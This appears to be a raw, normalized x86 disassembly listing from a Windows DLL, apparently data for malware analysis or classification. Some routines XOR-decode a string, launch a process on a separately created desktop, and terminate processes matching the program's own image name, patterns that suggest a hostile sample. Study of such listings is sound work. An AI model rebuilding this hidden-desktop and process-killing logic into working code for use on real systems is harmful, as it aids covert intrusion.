lea eax [ edx + 0x6 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
push edi
mov esi 0x104
lea ebx [ ebp - 0x210 ]
call sub_1003d910
test eax eax
je r-xdata
lea eax [ edx + 0x3 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov esi edi
sub esi ecx
lea esi [ ebp - 0x73c ]
sub esi ecx
lea eax [ ebp - 0x73c ]
push eax
lea ebx [ ebp - 0x210 ]
call sub_1003d910
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x74c ]
push eax
mov esi 0x208
lea ebx [ ebp - 0x620 ]
call sub_1003d910
test eax eax
je r-xdata
lea eax [ edx + 0xb ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffdf6 ]
test ecx ecx
je r-xdata
jmp r-xdata
push edi
mov esi 0x208
lea ebx [ ebp - 0x620 ]
call sub_1003d910
test eax eax
je r-xdata
lea eax [ edx + 0x8 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffdf6 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x740 ]
push ecx
lea ebx [ ebp - 0x620 ]
call sub_1003d910
test eax eax
je r-xdata
mov eax 0xc
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x73c ]
push eax
lea ebx [ ebp - 0x620 ]
call sub_1003d910
test eax eax
je r-xdata
mov eax 0x9
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
lea ebx [ ebp - 0x620 ]
call sub_1003d910
test eax eax
je r-xdata
mov eax 0xd
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax 0xa
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x114
lea eax [ ebp - 0x738 ]
push 0x0
push eax
call sub_10079a10
add esp 0xc
lea ecx [ ebp - 0x738 ]
push ecx
mov [ ebp - 0x738 ] 0x114
call [ GetVersionExW@IAT ]
cmp [ ebp - 0x734 ] 0x6
jae r-xdata
mov eax 0xe
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x620 ]
push eax
lea ecx [ ebp - 0x210 ]
call sub_1004ed40
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
call [ GetTickCount@IAT ]
push eax
call sub_10066597
add esp 0x4
call sub_100614c9
xor edx edx
mov ecx 0xa
div ecx
add edx 0x3
push edx
call sub_10033e60
lea esi [ ebp - 0x760 ]
mov ebx eax
mov [ ebp - 0x760 ] 0x0
call sub_100617b0
test eax eax
jne r-xdata
mov edx [ ebp - 0x744 ]
push edx
call sub_10019ae0
test eax eax
je r-xdata
lea edi [ ebp - 0x620 ]
lea ecx [ ebp - 0x210 ]
lea esi [ ebp - 0x760 ]
call sub_10036470
test eax eax
je r-xdata
mov eax 0xf
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x760 ]
call sub_1003ead0
test eax eax
je r-xdata
mov eax 0x10
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x760 ]
call sub_1002c620
test eax eax
je r-xdata
mov eax 0x11
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push ebx
call sub_1006591f
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax 0x12
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1001734f
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_100173a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081302
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ebx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
xor eax eax
mov [ ebp - 0x4 ] 0x1
cmp ebx eax
je r-xdata
mov ecx edi
call sub_1000d680
sub esi eax
mov eax 0x38e38e39
imul esi
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x24
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] eax
push esi
mov ecx ebx
mov [ ebx ] dx
call sub_10036380
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov ecx [ esi + 0x20 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ edi ]
lea eax [ esi + esi * 8 ]
mov esi [ edi + 0x4 ]
lea ebx [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx edi
call sub_1000d680
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push ebx
mov ecx esi
mov [ esi ] dx
call sub_10036380
mov eax [ ebx + 0x1c ]
mov [ esi + 0x1c ] eax
mov ecx [ ebx + 0x20 ]
mov [ esi + 0x20 ] ecx
jmp r-xdata
sub_10017490
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
cmp [ ebx ] 0x0
push edi
mov edi [ rw-data ]
jne r-xdata
add edi 0xd4
push esi
lea eax [ ebp - 0x4 ]
mov ecx edi
call sub_10051630
mov esi [ eax ]
mov eax [ rw-data ]
cmp esi [ eax + 0xd8 ]
jne r-xdata
pop edi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xc ]
push eax
call [ UnmapViewOfFile@IAT ]
mov ecx [ esi + 0x10 ]
push ecx
call [ CloseHandle@IAT ]
push esi
lea edx [ ebp - 0x4 ]
push edx
push edi
mov [ ebx ] 0x0
call sub_10019820
pop esi
pop edi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop esi
pop edi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
sub_10017510
push esi
mov esi ecx
mov edx 0x104
sub esi eax
lea ebx [ ebx ]
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor ecx ecx
mov [ eax ] cx
pop esi
retn
mov [ eax - 0x2 ] dx
pop esi
retn
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
mov [ eax - 0x2 ] dx
pop esi
retn
sub_10017560
push ebp
mov ebp esp
sub esp 0x2b4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov ecx [ r--data ]
mov ebx edx
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffec
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0xa
jb r-xdata
xor eax eax
push eax
push __dos_header
push eax
push eax
push eax
lea ecx [ ebp - 0x24 ]
push ecx
mov [ ebp - 0x10 ] ax
call [ CreateDesktopW@IAT ]
mov esi eax
mov [ ebp - 0x254 ] esi
test esi esi
jne r-xdata
push 0x44
lea edx [ ebp - 0x2b0 ]
push 0x0
push edx
call sub_10079a10
xor eax eax
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] eax
add esp 0xc
lea edx [ ebp - 0x3c ]
mov eax 0xc9
mov [ ebp - 0x2b0 ] 0x44
call sub_10013830
mov eax edx
lea ecx [ ebp - 0x264 ]
push ecx
lea edx [ ebp - 0x2b0 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edi
push 0x0
mov [ ebp - 0x2a8 ] eax
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
lea eax [ esi + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xc ]
mov eax 0x114
call sub_10013830
lea ecx [ ebp - 0x254 ]
mov eax edx
push ecx
lea esi [ ebp - 0x250 ]
mov [ ebp - 0x24c ] eax
call sub_1004bfa0
add esp 0x4
cmp [ ebp - 0x250 ] 0x0
jne r-xdata
push esi
call [ CloseDesktop@IAT ]
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x248 ]
push eax
call [ SysAllocString@IAT ]
mov esi [ PostMessageW@IAT ]
push 0x0
push 0x0
mov [ ebx ] eax
mov ecx [ ebp - 0x250 ]
push 0x10
push ecx
call esi
mov edx [ ebp - 0x250 ]
push 0x0
push 0x0
push 0x12
push edx
call esi
mov edi [ Sleep@IAT ]
mov ebx [ IsWindow@IAT ]
xor esi esi
mov edx [ ebp - 0x264 ]
push 0x0
push edx
call [ TerminateProcess@IAT ]
mov eax [ ebp - 0x260 ]
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ ebp - 0x264 ]
push ecx
call esi
mov edx [ ebp - 0x254 ]
push edx
call [ CloseDesktop@IAT ]
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x260 ]
mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ ebp - 0x264 ]
push edx
call esi
mov eax [ ebp - 0x254 ]
push eax
jmp r-xdata
inc esi
cmp esi 0x12c
jl r-xdata
call [ CloseDesktop@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x64
call edi
mov eax [ ebp - 0x250 ]
push eax
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x264 ]
push 0x0
push ecx
call [ TerminateProcess@IAT ]
mov edx [ ebp - 0x260 ]
mov esi [ CloseHandle@IAT ]
push edx
call esi
mov eax [ ebp - 0x264 ]
push eax
call esi
mov ecx [ ebp - 0x254 ]
push ecx
sub_100177a8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
test eax eax
jne r-xdata
mov esi [ eax ]
mov edi [ eax + 0x4 ]
call sub_10007cfe
mov esi [ eax + 0x8 ]
call sub_1005150b
mov edi eax
jmp r-xdata
and [ ebp + 0x14 ] 0x0
push edi
call sub_1003042d
pop ecx
lea ecx [ ebp + 0x14 ]
push ecx
push 0x0
push eax
call sub_10066fa7
pop ecx
push eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x0
push edi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov ax [ ebp + 0xc ]
mov ecx 0xff
cmp ax cx
ja r-xdata
test esi esi
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_10017830
push ebp
mov ebp esp
sub esp 0x648
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
push 0x0
push 0x2
call [ CreateToolhelp32Snapshot@IAT ]
mov edi eax
mov [ ebp - 0x644 ] edi
cmp edi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x640 ]
push eax
push edi
mov [ ebp - 0x640 ] 0x22c
call [ Process32FirstW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push ebx
push esi
call [ GetCurrentProcessId@IAT ]
mov ebx [ OpenProcess@IAT ]
push eax
push 0x0
push 0x400
mov [ ebp - 0x648 ] eax
call ebx
mov esi eax
test esi esi
jne r-xdata
push edi
call [ CloseHandle@IAT ]
mov eax 0x2
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x104
lea ecx [ ebp - 0x20c ]
push ecx
push esi
call [ GetProcessImageFileNameW@IAT ]
push esi
test eax eax
jne r-xdata
push edi
call [ CloseHandle@IAT ]
lea eax [ esi + 0x3 ]
pop esi
pop ebx
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edi [ CloseHandle@IAT ]
call edi
jmp r-xdata
mov esi [ CloseHandle@IAT ]
call esi
push edi
call esi
pop esi
pop ebx
mov eax 0x4
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x638 ]
cmp eax [ ebp - 0x648 ]
je r-xdata
mov esi [ ebp - 0x644 ]
lea eax [ ebp - 0x640 ]
push eax
push esi
call [ Process32NextW@IAT ]
test eax eax
jne r-xdata
push eax
push 0x0
push 0x400
call ebx
mov esi eax
test esi esi
je r-xdata
push esi
call edi
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x104
lea edx [ ebp - 0x414 ]
push edx
push esi
call [ GetProcessImageFileNameW@IAT ]
push esi
test eax eax
je r-xdata
call edi
call edi
lea eax [ ebp - 0x20c ]
push eax
lea ecx [ ebp - 0x414 ]
push ecx
call [ StrCmpW@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x638 ]
push edx
push eax
push 0x1
call ebx
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x644 ]
push ecx
call edi
pop esi
pop ebx
mov eax 0x5
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x0
push esi
call [ TerminateProcess@IAT ]
push esi
test eax eax
je r-xdata
call edi
mov edx [ ebp - 0x644 ]
push edx
call edi
mov ecx [ ebp - 0x4 ]
pop esi
pop ebx
xor ecx ebp
mov eax 0x6
pop edi
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10017a20
cmp ecx edx
je r-xdata
retn
push esi
add ecx 0x8
add eax 0x8
cmp ecx edx
jne r-xdata
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
test eax eax
je r-xdata
pop esi
sub_10017a3f
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1004dca7
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_10017a88
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
pop ebp
retn
sub_10017abb
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1002cc99
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
push 0x3
call sub_1001bb2c
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_1001bb2c
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_1005864b
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_10079b60
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_100492ed
push esi
call sub_1002bd31
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_1005864b
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_10031c71
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_1002bd31
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_100402aa
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_10031c71
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_10051266
add esp 0xc
jmp r-xdata
sub_10017c6a
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10017d00
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x20 ]
mov [ esi ] ecx
mov ecx [ ebp + 0x10 ]
mov [ edi ] edx
xor edx edx
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
cmp eax ecx
setne dl
mov [ ebp - 0x10 ] edx
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x1c
mov eax [ ebp + 0x1c ]
cmp [ edi ] eax
je r-xdata
mov ebx [ edi ]
call sub_1006bc7c
mov ecx [ ebp + 0x1c ]
mov edx [ ebp - 0x18 ]
sub ecx ebx
add edx 0x8
cmp eax ecx
mov eax [ ebp - 0x14 ]
push edx
push eax
jg r-xdata
mov ecx [ eax ]
mov eax [ esi ]
mov [ ebp - 0x1c ] ecx
movzx ecx [ eax ]
push ecx
lea edx [ ebp - 0xc ]
push edx
call sub_100177a8
mov ebx eax
add esp 0x10
test ebx ebx
js r-xdata
mov ecx [ esi ]
movzx edx [ ecx ]
push edx
push ebx
call sub_100177a8
add esp 0x10
test eax eax
js r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x1c
mov eax [ edi ]
mov ecx [ ebp + 0x1c ]
sub ecx eax
cmp ecx ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
mov [ edx ] ecx
push ebx
lea edx [ ebp - 0xc ]
push edx
push eax
call sub_100796a0
add [ esi ] 0x2
add esp 0xc
add [ edi ] ebx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x0
cmp [ esi ] eax
jne r-xdata
jmp r-xdata
sub_10017e08
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jns r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_100213dc
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_10017e40
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0x4 ]
push edi
inc eax
push eax
push ecx
call sub_10020380
mov edx [ esi + 0x4 ]
mov edi eax
mov eax [ esi ]
push edx
push eax
push edi
call sub_100796a0
mov ecx [ esi + 0x4 ]
add esp 0x14
mov [ edi + ecx ] 0x0
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_10017e75
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003fdaa
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_10017ea0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov eax ebx
push edi
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ecx + 0x10 ]
sub eax edx
mov edi eax
mov eax esi
cmp esi edi
jb r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax edi
push eax
push ebx
push ecx
call sub_10050b90
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ecx ]
pop edi
xor ecx ecx
test eax eax
pop esi
sete al
pop ebx
pop ebp
retn
cmp esi edi
jae r-xdata
xor eax eax
cmp esi edi
setne al
or eax 0xffffffff
pop edi
xor ecx ecx
test eax eax
pop esi
sete al
pop ebx
pop ebp
retn
sub_10017f10
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x24
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_10019180
mov eax esi
mov esp ebp
pop ebp
retn
sub_10017f40
push esi
mov esi [ eax ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push edi
mov edi [ lstrcmpW@IAT ]
mov edi edi
pop edi
mov eax esi
pop esi
retn
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov ecx [ ebx ]
mov eax [ esi ]
push ecx
mov ecx [ eax ]
push ecx
call edi
test eax eax
je r-xdata
sub_10017f8a
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100471ac
add esp 0x14
pop ebp
retn 0x10
sub_10017fab
push 0x80
mov eax sub_1007f81d
call sub_1001bb6b
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x8c ] eax
movzx eax [ ebp + 0x1c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x2c ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x68 ]
push eax
mov ecx ebx
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_10004f60
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x78 ] eax
call sub_10069ce0
mov ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_10051f6c
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
and [ ebp - 0x1c ] 0x0
movzx eax ax
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
lea eax [ edi + 0x8 ]
push eax
push 0x0
push 0x30
mov [ ebp - 0x4 ] 0x2
call sub_1003088d
movzx eax ax
mov [ ebp - 0x70 ] eax
mov al [ esi ]
add esp 0xc
cmp al 0x2b
je r-xdata
mov [ ebp - 0x84 ] 0x1
cmp al 0x2d
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
and [ ebp - 0x54 ] eax
and [ ebp - 0x84 ] 0x0
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
call sub_100680bc
mov eax [ eax ]
push [ ebp - 0x50 ]
mov al [ eax ]
push 0x65
push esi
mov [ ebp - 0x58 ] al
mov [ ebp - 0x57 ] 0x65
call sub_10079480
push [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
movsx eax [ ebp - 0x58 ]
push eax
push esi
call sub_10079480
add esp 0x18
mov [ ebp - 0x60 ] eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x50 ]
add eax [ ebp - 0x54 ]
mov ecx [ ebx + 0x20 ]
add eax [ ebp - 0x74 ]
xor edx edx
add eax [ ebp - 0x5c ]
cmp [ ebx + 0x24 ] edx
jl r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov [ ebp - 0x4c ] edx
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movsx eax [ ebp - 0x58 ]
push [ ebp - 0x50 ]
push eax
push esi
call sub_10079480
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x100
jne r-xdata
cmp ecx eax
jbe r-xdata
cmp ecx edx
jbe r-xdata
push [ ebp - 0x50 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_10067f90
mov eax [ ebp - 0x4c ]
test eax eax
jne r-xdata
